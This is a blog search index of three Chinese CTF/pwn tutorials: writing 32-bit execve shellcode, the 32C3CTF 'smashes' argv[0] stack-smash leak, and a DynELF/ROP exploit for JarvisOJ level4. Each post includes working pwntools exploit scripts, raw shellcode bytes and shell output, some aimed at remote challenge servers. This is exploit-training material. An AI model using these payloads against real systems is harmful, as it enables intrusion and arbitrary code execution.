<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[shellcode]]></title>
    <url>%2F2018%2F05%2F11%2Fshellcode%2F</url>
    <content type="text"><![CDATA[Preface之前一直对shellcode的编写一知半解，不知所以。这就好好学习一下shellcode的编写。 shellcode是一组可注入的指令，可以在被攻击的程序中运行。由于shellcode要直接操作寄存器和函数，所以必须是十六进制的形式。那么为什么要写shellcode呢？因为我们要让目标程序以不同于设计者预期的方式运行，而操作的程序的方法之一就是强制它产生系统调用（system,call,syscall)。通过系统调用，你可以直接访问系统内核，成功attack。在Linux里有两个方法来执行系统调用: 间接方法: c函数包装（libc） 直接方法: 用汇编指令（通过把适当的参数加载到寄存器，然后调用int 0x80软中断） 这里主要学习一下直接方法，借用系统调用execve，关于其他的exec关联函数组下次好好复习一下 Execve头文件：#include &lt;unistd.h&gt; 定义函数：int execve(const char * filename, char * const argv[], char * const envp[]); 函数说明： filename必须是一个二进制的可执行文件，或者是一个脚本以#！格式开头的解释器参数参数。如果是后者，这个解释器必须是一个可执行的有效的路径名，但是不是脚本本身，它将调用解释器作为文件名。 argv 是要调用的程序执行的参数序列，也就是我们要调用的程序需要传入的参数。 envp 也是参数序列，一般来说他是一种键值对的形式 key=value. 作为我们给执行文件的新环境变量数组 返回值：如果执行成功则函数不会返回, 执行失败则直接返回-1, 失败原因存于errno 中. 123456789#include &lt;unistd.h&gt;main()&#123; char * argv[] = &#123;"ls", "-l", "/tmp", NULL&#125;; char * envp[] = &#123;"PATH=/bin", 0&#125;; execve("/bin/ls", argv, envp);&#125;//功能相当于 ls -l Shellcode Linux系统调用是以int 0x80指令来陷入内核态的，系统调用号通过eax来传递，参数分别是ebx, ecx, edx, edi, esi来传递。 ###编写汇编源码 先来看看execve的系统调用号是0x0b,可以在syscall_kernelgrok中查询 1234567#include &lt;unistd.h&gt;main()&#123; char * argv[] = &#123;"/bin/sh", NULL&#125;; char * envp[] = &#123;NULL&#125;; execve("/bin/sh", argv, envp);&#125; 上述程序可以获取并返回shell 开始手动写 1234567891011121314151617xor ecx,ecxxor edx,edxpush ecx ;//压入字符串结束符push &quot;//sh&quot;push &quot;/bin&quot; ;//入栈mov ebx,esp ;//将栈内字符串地址赋给ebx，即系统调用的第一个参数push edx ;// argv[1]入栈push ebx ;// argv[0]入栈mov ecx,esp ;// 将argv地址赋给exc,即系统调用的第二个参数push edx ;//系统调用的第三个参数xor eax,eaxmov al,0Bh ;//execve系统调用号int 80h ;//软中断指令;//保存为shell.asm 编译生成 shell.o后链接并测试 12345test@test-vm-x86:~/Desktop/system$ nasm -f elf32 shell.asmtest@test-vm-x86:~/Desktop/system$ ld -m elf_i386 -o shell shell.otest@test-vm-x86:~/Desktop/system$ ./shell $ lsshell shell.asm shell.asm~ shell.o shellcode执行后，可以起一个新的shell. 提取shellcode123456789101112131415161718192021test@test-vm-x86:~/Desktop/system$ objdump -d shellshell: file format elf32-i386Disassembly of section .text:08048060 &lt;_start&gt;: 8048060: 31 c9 xor %ecx,%ecx 8048062: 31 d2 xor %edx,%edx 8048064: 51 push %ecx 8048065: 68 2f 2f 73 68 push $0x68732f2f 804806a: 68 2f 62 69 6e push $0x6e69622f 804806f: 89 e3 mov %esp,%ebx 8048071: 52 push %edx 8048072: 53 push %ebx 8048073: 89 e1 mov %esp,%ecx 8048075: 52 push %edx 8048076: 31 c0 xor %eax,%eax 8048078: b0 0b mov $0xb,%al 804807a: cd 80 int $0x80 提取shellcode 1shellcode = &quot;\x31\xc9\x31\xd2\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x52\x31\xc0\xb0\x0b\xcd\x80&quot; ##Example 这里我们以bamboofox中的ret2shellcode为例 12345678910#exploit.py#!/usr/bin/env pythonfrom pwn import *sh = process('./ret2shellcode')shellcode = "\x31\xc9\x31\xd2\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x52\x31\xc0\xb0\x0b\xcd\x80"buf2_addr = 0x804a080sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))sh.interactive() 12345678test@test-vm-x86:~/Desktop/pwn/stackoverflow/ret2shellcode$ python exploit.py [!] Pwntools does not support 32-bit Python. Use a 64-bit release.[+] Starting local process './ret2shellcode': pid 6983[*] Switching to interactive modeNo system for you this time !!!bye bye ~$ lsexploit.py exploit.py~ ret2shellcode ret2shellcode.c ret2shellcode.idb$ 就写到这把 下次再补充]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2015-32C3CTF-smashes]]></title>
    <url>%2F2017%2F10%2F28%2F2015-32C3CTF-smashes%2F</url>
    <content type="text"><![CDATA[Preface这次学习的是Stack smash姿势。程序如果加了canary保护后，一旦输入导致栈溢出，程序就会报错。程序会执行__stack_chk_fail函数来打印argv[0]指针所指向的字符串，一般情况下是程序名。 也就是说，只要程序开了canary栈保护，触发栈溢出，就可以覆盖argv[0]来泄露想要的信息(&amp;set LIBC_FATAL_STDERR_=1)。 12345678910111213141516171819/*__stack_chk_fail*/void__attribute__ ((noreturn))__stack_chk_fail (void) &#123; __fortify_fail ("stack smashing detected"); &#125;void__attribute__ ((noreturn)) internal_function__fortify_fail (const char *msg) &#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "&lt;unknown&gt;"); &#125; Analysis例题为：2015-32C3CTF-smashes 查看保护信息12345678test@test-vm-i64:/Home/Desktop/JarvisOJ/PWN/Smashes$ gdb -q ./smashesReading symbols from ./smashes...(no debugging symbols found)...done.gdb-peda$ checksecCANARY : ENABLEDFORTIFY : ENABLEDNX : ENABLEDPIE : disabledRELRO : disabled Program123456789101112131415161718192021222324252627282930unsigned __int64 sub_4007E0()&#123; __int64 v0; // rbx int v1; // eax __int64 name; // [rsp+0h] [rbp-128h] unsigned __int64 v4; // [rsp+108h] [rbp-20h] v4 = __readfsqword(0x28u); __printf_chk(1LL, "Hello!\nWhat's your name? "); if ( !_IO_gets(&amp;name) )LABEL_9: _exit(1); v0 = 0LL; __printf_chk(1LL, "Nice to meet you, %s.\nPlease overwrite the flag: "); while ( 1 ) &#123; v1 = _IO_getc(stdin); if ( v1 == -1 ) goto LABEL_9; if ( v1 == 10 ) break; byte_600D20[v0++] = v1; if ( v0 == 32 ) goto LABEL_8; &#125; memset((void *)((signed int)v0 + 6294816LL), 0, (unsigned int)(32 - v0));LABEL_8: puts("Thank you, bye!"); return __readfsqword(0x28u) ^ v4;&#125; 很显然在第十行 if ( !_IO_gets(&amp;name) ) 存在栈溢出。 运行发现 1test@test-vm-i64:/Home/Desktop/JarvisOJ/PWN/Smashes$ python -c 'print "a"*0x200 + "\n" + "a"' | ./smashes Hello!What's your name? Nice to meet you, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.Please overwrite the flag: Thank you, bye!* stack smashing detected *: ./smashes terminatedAborted (core dumped) 很显然，可以利用Preface中所介绍的Stack smash姿势。 Solution找到程序argv[0]所在地址，利用栈溢出，将argv[0]地址覆盖为flag地址，即可泄露。 确定argv[0]地址1234567891011121314151617181920212223242526272829303132333435363738394041424344454647gdb-peda$ b *0x00000000004006D0Breakpoint 1 at 0x4006d0gdb-peda$ rStarting program: /home/test/Desktop/pwn/smashes [----------------------------------registers-----------------------------------]RAX: 0x4006d0 (sub rsp,0x8)RBX: 0x0 RCX: 0x0 RDX: 0x7fffffffdf08 --&gt; 0x7fffffffe2b7 ("XDG_VTNR=7")RSI: 0x7fffffffdef8 --&gt; 0x7fffffffe298 ("/home/test/Desktop/pwn/smashes")RDI: 0x1 RBP: 0x0 RSP: 0x7fffffffde18 --&gt; 0x7ffff7a32f45 (&lt;__libc_start_main+245&gt;: mov edi,eax)RIP: 0x4006d0 (sub rsp,0x8)R8 : 0x7ffff7dd4e80 --&gt; 0x0 R9 : 0x7ffff7dea700 (&lt;_dl_fini&gt;: push rbp)R10: 0x7fffffffdca0 --&gt; 0x0 R11: 0x7ffff7a32e50 (&lt;__libc_start_main&gt;: push r14)R12: 0x4006ee (xor ebp,ebp)R13: 0x7fffffffdef0 --&gt; 0x1 R14: 0x0 R15: 0x0EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x4006c0 &lt;_IO_gets@plt&gt;: jmp QWORD PTR [rip+0x20062a] # 0x600cf0 &lt;_IO_gets@got.plt&gt; 0x4006c6 &lt;_IO_gets@plt+6&gt;: push 0x9 0x4006cb &lt;_IO_gets@plt+11&gt;: jmp 0x400620=&gt; 0x4006d0: sub rsp,0x8 0x4006d4: mov rdi,QWORD PTR [rip+0x200665] # 0x600d40 &lt;stdout&gt; 0x4006db: xor esi,esi 0x4006dd: call 0x400660 &lt;setbuf@plt&gt; 0x4006e2: call 0x4007e0[------------------------------------stack-------------------------------------]0000| 0x7fffffffde18 --&gt; 0x7ffff7a32f45 (&lt;__libc_start_main+245&gt;: mov edi,eax)0008| 0x7fffffffde20 --&gt; 0x0 0016| 0x7fffffffde28 --&gt; 0x7fffffffdef8 --&gt; 0x7fffffffe298 ("/home/test/Desktop/pwn/smashes")0024| 0x7fffffffde30 --&gt; 0x100000000 0032| 0x7fffffffde38 --&gt; 0x4006d0 (sub rsp,0x8)0040| 0x7fffffffde40 --&gt; 0x0 0048| 0x7fffffffde48 --&gt; 0x855d5278e2195fc0 0056| 0x7fffffffde50 --&gt; 0x4006ee (xor ebp,ebp)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, 0x00000000004006d0 in ?? ()gdb-peda$ 从stack中可以看出，0x7fffffffdef8为argv[0]的地址。 确定偏移现在需要计算argv[0]与buffer之间的偏移。在call __IO_gets（0x00000000004006d0）下断点 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849gdb-peda$ cContinuing.Hello!What's your name? [----------------------------------registers-----------------------------------]RAX: 0x19 RBX: 0x0 RCX: 0x7ffff7b00390 (&lt;__write_nocancel+7&gt;: cmp rax,0xfffffffffffff001)RDX: 0x19 RSI: 0x7ffff7dd59e0 --&gt; 0x0 RDI: 0x7fffffffdce0 --&gt; 0x7ffff7a21078 --&gt; 0xc001200003322 RBP: 0x0 RSP: 0x7fffffffdce0 --&gt; 0x7ffff7a21078 --&gt; 0xc001200003322 RIP: 0x40080e (call 0x4006c0 &lt;_IO_gets@plt&gt;)R8 : 0x7ffff7fdd740 (0x00007ffff7fdd740)R9 : 0x400934 ("Hello!\nWhat's your name? ")R10: 0x7ffff7fdd740 (0x00007ffff7fdd740)R11: 0x246 R12: 0x4006ee (xor ebp,ebp)R13: 0x7fffffffdef0 --&gt; 0x1 R14: 0x0 R15: 0x0EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x400804: xor eax,eax 0x400806: call 0x4006b0 &lt;__printf_chk@plt&gt; 0x40080b: mov rdi,rsp=&gt; 0x40080e: call 0x4006c0 &lt;_IO_gets@plt&gt; 0x400813: test rax,rax 0x400816: je 0x40089f 0x40081c: mov rdx,rsp 0x40081f: mov esi,0x400960Guessed arguments:arg[0]: 0x7fffffffdce0 --&gt; 0x7ffff7a21078 --&gt; 0xc001200003322 [------------------------------------stack-------------------------------------]0000| 0x7fffffffdce0 --&gt; 0x7ffff7a21078 --&gt; 0xc001200003322 0008| 0x7fffffffdce8 --&gt; 0x7ffff7ff74c0 --&gt; 0x7ffff7a11000 --&gt; 0x10102464c457f 0016| 0x7fffffffdcf0 --&gt; 0x7fffffffde40 --&gt; 0x0 0024| 0x7fffffffdcf8 --&gt; 0x7ffff7ff7a10 --&gt; 0x400458 ("GLIBC_2.2.5")0032| 0x7fffffffdd00 --&gt; 0x1 0040| 0x7fffffffdd08 --&gt; 0x7ffff7ffe520 --&gt; 0x7ffff7ffe480 --&gt; 0x7ffff7ff79c8 --&gt; 0x7ffff7ffe1c8 --&gt; 0x0 0048| 0x7fffffffdd10 --&gt; 0x7ffff7ffe1c8 --&gt; 0x0 0056| 0x7fffffffdd18 --&gt; 0x7ffff7de4b31 (&lt;_dl_lookup_symbol_x+305&gt;: cmp eax,0x0)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 3, 0x000000000040080e in ?? ()gdb-peda$ 因为我们输入的字符串的起始地址其实就是调用 __IO_gets 之前的rsp，所以从registers中可以得到rsp为0x7fffffffdce0。 偏移为 123gdb-peda$ distance $rsp 0x7fffffffdef8From 0x7fffffffdce0 to 0x7fffffffdef8: 536 bytes, 134 dwordsgdb-peda$ 或者 12&gt;&gt;&gt; print hex(0x7fffffffdef8-0x7fffffffdce0)0x218 好了，已经知道了偏移，要寻找需要leak的地址即flag的地址 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667gdb-peda$ b *0x0000000000400873Breakpoint 1 at 0x400873gdb-peda$ rStarting program: /home/test/Desktop/pwn/smashes Hello!What's your name? aNice to meet you, a.Please overwrite the flag: bbbbbbbbbb[----------------------------------registers-----------------------------------]RAX: 0xa ('\n')RBX: 0xa ('\n')RCX: 0x7ffff7b00330 (&lt;__read_nocancel+7&gt;: cmp rax,0xfffffffffffff001)RDX: 0x16 RSI: 0x0 RDI: 0x600d2a ("s the flag on server&#125;")RBP: 0x0 RSP: 0x7fffffffdce0 --&gt; 0x7ffff7a20061 --&gt; 0x2200000000000fd3 RIP: 0x400873 (call 0x400670 &lt;memset@plt&gt;)R8 : 0x7ffff7fdd740 (0x00007ffff7fdd740)R9 : 0x400960 ("Nice to meet you, %s.\nPlease overwrite the flag: ")R10: 0x7fffffffdaa0 --&gt; 0x0 R11: 0x246 R12: 0x4006ee (xor ebp,ebp)R13: 0x7fffffffdef0 --&gt; 0x1 R14: 0x0 R15: 0x0EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x400868: xor esi,esi 0x40086a: sub edx,ebx 0x40086c: add rdi,0x600d20=&gt; 0x400873: call 0x400670 &lt;memset@plt&gt; 0x400878: mov edi,0x40094e 0x40087d: call 0x400640 &lt;puts@plt&gt; 0x400882: mov rax,QWORD PTR [rsp+0x108] 0x40088a: xor rax,QWORD PTR fs:0x28Guessed arguments:arg[0]: 0x600d2a ("s the flag on server&#125;")arg[1]: 0x0 arg[2]: 0x16 [------------------------------------stack-------------------------------------]0000| 0x7fffffffdce0 --&gt; 0x7ffff7a20061 --&gt; 0x2200000000000fd3 0008| 0x7fffffffdce8 --&gt; 0x7ffff7ff74c0 --&gt; 0x7ffff7a11000 --&gt; 0x10102464c457f 0016| 0x7fffffffdcf0 --&gt; 0x7fffffffde40 --&gt; 0x0 0024| 0x7fffffffdcf8 --&gt; 0x7ffff7ff7a10 --&gt; 0x400458 ("GLIBC_2.2.5")0032| 0x7fffffffdd00 --&gt; 0x1 0040| 0x7fffffffdd08 --&gt; 0x7ffff7ffe520 --&gt; 0x7ffff7ffe480 --&gt; 0x7ffff7ff79c8 --&gt; 0x7ffff7ffe1c8 --&gt; 0x0 0048| 0x7fffffffdd10 --&gt; 0x7ffff7ffe1c8 --&gt; 0x0 0056| 0x7fffffffdd18 --&gt; 0x7ffff7de4b31 (&lt;_dl_lookup_symbol_x+305&gt;: cmp eax,0x0)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, 0x0000000000400873 in ?? ()gdb-peda$ find bbbbSearching for 'bbbb' in: None rangesFound 4 results, display max 4 items:smashes : 0x600d20 ("bbbbbbbbbbs the flag on server&#125;")smashes : 0x600d24 ("bbbbbbs the flag on server&#125;") mapped : 0x7ffff7ff5000 ("bbbbbbbbbb\n") mapped : 0x7ffff7ff5004 --&gt; 0xa626262626262 ('bbbbbb\n')gdb-peda$ find "the flag on server"Searching for 'the flag on server' in: None rangesFound 2 results, display max 2 items:smashes : 0x400d2c ("the flag on server&#125;")smashes : 0x600d2c ("the flag on server&#125;")gdb-peda$ 在memset函数处下断点，通过find输入的字符串，可以发现0x600d20处的flag被输入的字符串覆盖。但是还发现0x400d2c还有一个flag，用ida可以发现是memset函数将flag进行了备份操作。 Local Test1234567891011121314151617181920#expfrom pwn import *#context.log_level = 'debug'smash = ELF('./smashes')if args['REMOTE']: sh = remote('pwn.jarvisoj.com', 9877)else: sh = process('./smashes')old_flag_addr = 0x600D20new_flag_addr = 0x400d20payload = 'a' *0x218 + p64(old_flag_addr)#payload = 'a' *0x218 + p64(new_flag_addr)sh.recvuntil('name? ')sh.sendline(payload)sh.recvuntil('flag: ')sh.sendline('bb')data = sh.recv()#sh.interactive()print data 分别测试old_flag_addr和new_flag_addr， 123456789101112131415test@test-vm-i64:~/Desktop/pwn$ python old_exp.py [+] Starting local process './smashes': pid 20831Thank you, bye!*** stack smashing detected ***: bb terminated[*] Stopped process './smashes' (pid 20831)test@test-vm-i64:~/Desktop/pwn$ python new_exp.py [+] Starting local process './smashes': pid 20634Thank you, bye!*** stack smashing detected ***: PCTF&#123;Here's the flag on server&#125; terminated[*] Stopped process './smashes' (pid 20634) Remote Test123456test@test-vm-i64:~/Desktop/pwn$ python exp1.py REMOTE[+] Opening connection to pwn.jarvisoj.com on port 9877: DoneThank you, bye!*** stack smashing detected ***: PCTF&#123;57dErr_Smasher_good_work!&#125; terminated[*] Closed connection to pwn.jarvisoj.com port 9877 最后得到flag : PCTF{57dErr_Smasher_good_work!} Expansion_IO_getc &amp; _IO_getsgets（接受一个参数，文件指针）不判断目标数组是否能够容纳读入的字符，可能导致存储溢出(不建议使用） _IO_getc直到读取换行符或0x2`字节 __libc_message从别的wp中发现，他们Remote过程中，并未成功。在__stack_chk_fail中含有__libc_message函数，原因就在于它。 123456789101112131415void__libc_message (int do_abort, const char *fmt, ...)&#123; va_list ap; int fd = -1; va_start (ap, fmt); /* Open a descriptor for /dev/tty unless the user explicitly requests errors on standard error. */ const char *on_2 = __libc_secure_getenv ("LIBC_FATAL_STDERR_"); if (on_2 == NULL || *on_2 == '\0') fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY); if (fd == -1) fd = STDERR_FILENO; /*......*/&#125; 如果LIBC_FATAL_STDERR_ == NULL || *LIBC_FATAL_STDERR_ == &#39;\0&#39;,stderr会redirect到_PATH_TTY，通常是/dev/tty，因此错误信息将不会输出到stderr而是服务端可见的设备。 远程时需要设置这个环境变量，正好可以用这个环境变量去覆盖flag的内容。但是不知道为什么我remote测试时不需要。 1234567891011121314151617181920#expfrom pwn import *#context.log_level = 'debug'smash = ELF('./smashes')if args['REMOTE']: sh = remote('pwn.jarvisoj.com', 9877)else: sh = process('./smashes')old_flag_addr = 0x600D20new_flag_addr = 0x400d20payload = 'a' *0x218 + p64(old_flag_addr)#payload = 'a' *0x218 + p64(new_flag_addr)sh.recvuntil('name? ')sh.sendline(payload)sh.recvuntil('flag: ')sh.sendline('LIBC_FATAL_STDERR_=1')data = sh.recv()#sh.interactive()print data]]></content>
      <categories>
        <category>ROP</category>
      </categories>
      <tags>
        <tag>ROP</tag>
        <tag>Stack smash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初识ROP Memory Leak & DynELF]]></title>
    <url>%2F2017%2F10%2F25%2FROP-DynELF%2F</url>
    <content type="text"><![CDATA[Preface通过泄露内存的方式可以获取目标程序libc中各函数的地址，这种攻击方式可以绕过地址随机化保护。 记录一下使用DynELF泄露内存的ROP攻击题目[XMAN]level4(JarvisOJ)。 Analysis123456ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] return read(0, &amp;buf, 0x100u);&#125; read函数很显然有一个栈溢出漏洞，通过checksec发现存在地址随机化ASLR，每次程序时地址随机。 但是程序运行的时候libc已经载入到内存中了，这时libc的地址是一个固定的值，我们可以通过泄露内存的方法dump出程序正在使用的libc，从而找到libc中system函数的地址。 题目并没有给libc文件，故利用DynELF来leaksystem的地址。 Solution首先构建泄露system地址的payload: 1payload = 'a'*0x8c + p32(write_plt) + p32(main_addr) + p32(1) + p32(address) + p32(4) ret执行后，栈为： 构造leak函数： 123456def leak(address): payload = 'a'*0x8c + p32(write_plt) + p32(main_addr) + p32(1) + p32(address) + p32(4) sh.send(payload) data = sh.recv(4) print "%#x %s" % (address, data) return data 从而获得system地址，从而构造system(&quot;/bin/sh&quot;)完成攻击。但是程序中并没有system(&quot;/bin/sh&quot;)，可以构造一个read函数将其写入一个固定的位置，然后完成system调用，思路如下： 将/bin/sh写入固定位置的bss段内，payload1如下： 1payload1 = 'a'*0x8c + p32(read_plt) + p32(pop3ret) + p32(0) + p32(bss_addr) + p32(8) + p32(system_addr) + p32(main_addr) + p32(bss_addr) 我们构造的read函数有3个参数，这3个参数和read函数的返回地址不同，返回地址在ret指令执行时被pop出栈，但是这3个参数却还留在栈中，没有被弹出栈，这回影响我们构造的下一个函数system的执行，所以我们需要找一个连续pop三个寄存器的指令来平衡堆栈。 可以使用ROPgadget： 找到可利用的0x08048509 使用DynELF模块查找system函数地址： 123d = DynELF(leak, elf=ELF('./level4')) system_addr = d.lookup('system', 'libc') print "system_addr=" + hex(system_addr) EXP123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/bin/python from pwn import *# sh = process("./level4")sh = remote("pwn2.jarvisoj.com",9880)elf = ELF("./level4")#got&amp;pltwrite_got = elf.got['write']write_plt = elf.plt['write']read_got = elf.got['read']read_plt = elf.plt['read']#addrmain_addr = 0x08048470bss_addr = elf.bss() #e.symbols['__bss_start']pop3ret = 0x08048509#leakdef leak(address): payload = 'a'*0x8c + p32(write_plt) + p32(main_addr) + p32(1) + p32(address) + p32(4) sh.send(payload) data = sh.recv(4) print "%#x %s" % (address, data) return datadef main(): #leak d = DynELF(leak, elf=ELF('./level4')) system_addr = d.lookup('system', 'libc') print "system_addr=" + hex(system_addr) payload1 = 'a'*0x8c + p32(read_plt) + p32(pop3ret) + p32(0) + p32(bss_addr) + p32(8) + p32(system_addr) + p32(main_addr) + p32(bss_addr) #system('/bin/sh') sh.send(payload1) sh.send('/bin/sh\0') sh.interactive() if __name__ == '__main__': main()]]></content>
      <categories>
        <category>ROP</category>
      </categories>
      <tags>
        <tag>ROP</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
</search>
